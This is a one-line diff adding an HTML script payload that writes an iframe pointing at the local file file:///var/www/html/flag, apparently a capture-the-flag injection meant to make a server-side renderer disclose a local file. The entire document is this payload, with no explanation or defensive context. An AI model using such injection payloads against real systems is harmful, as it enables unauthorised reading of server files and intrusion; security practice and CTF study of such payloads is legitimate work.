@@ -1,0 +1,1 @@
+<script>document.write('<iframe src=file:///var/www/html/flag></iframe>');</script>
